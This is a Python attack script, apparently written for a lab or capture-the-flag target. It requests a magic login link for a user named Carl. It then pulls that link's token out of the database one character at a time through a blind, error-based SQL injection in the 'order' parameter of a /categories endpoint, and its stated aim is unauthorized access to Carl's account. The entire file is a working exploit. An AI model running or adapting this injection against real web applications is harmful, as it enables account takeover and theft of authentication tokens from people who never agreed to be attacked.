import requests 
import traceback
from urllib.parse import urljoin
import sys
import argparse

PROXY = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

def ExfilToken(target):
    """Request a magick link"""
    ReqMgkLnkUrl = urljoin(target, "/generateMagicLink")
    ReqMgkLnkData = {"username": "Carl"}
    try:
        ReqMgkLnkRes = requests.post(ReqMgkLnkUrl, data=ReqMgkLnkData)
        print("[+] Magicklink requested for user Carl")
    except Exception as e:
        print("[-] Error requesting a magiclink: ", e)
    """
    Token Lenght 
    """
    length = 0
    while True:
        TknLenPayload = f"(SELECT CASE WHEN (SELECT LENGTH(token) FROM tokens WHERE user_id=5 LIMIT 1)={length} THEN (1) ELSE 1/(SELECT 0) END)"
        length = length +1 
        TknLenUrl = urljoin(target, f"/categories?order={TknLenPayload}")
        try:
            TknLenghtRes = requests.get(TknLenUrl)
            if TknLenghtRes.status_code == 200:
                print(f"[+] Magiclink token length: {length}")
                break
        except Exception as e:
            print("[-] Error exfiltrating the token length: ", e)
            traceback.print_exc()
    """
    Exfil Magicklink token
    """
    token = ""
    for pos in range(1, int(length) + 1):
        for ascii_code in range(32, 127):
            exfilTknPayload = f"(SELECT CASE WHEN (SELECT (ASCII(SUBSTRING(token,{pos},1))) FROM tokens WHERE user_id=5 LIMIT 1)={ascii_code} THEN (1) ELSE 1/(SELECT 0) END)"
            exfilTknUrl = urljoin(target, f"/categories?order={exfilTknPayload}")
            try:
                exfilTknRes = requests.get(exfilTknUrl)
                if exfilTknRes.status_code == 200:
                    sys.stdout.write(chr(ascii_code))
                    sys.stdout.flush()
                    token = token + chr(ascii_code)
            except Exception as e:
                print("[-] Error exfiltrating the token: ", e)
                traceback.print_exc()
    print("\n[+] Magiclink Token exfiltrated: ", token)
    return token

def main():
    parser = argparse.ArgumentParser(description="Exfiltrate magiclink token to get an unauthorized access to user `Carl`")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    args = parser.parse_args()

    ExfilToken(args.target)

if __name__ == "__main__":
    main()
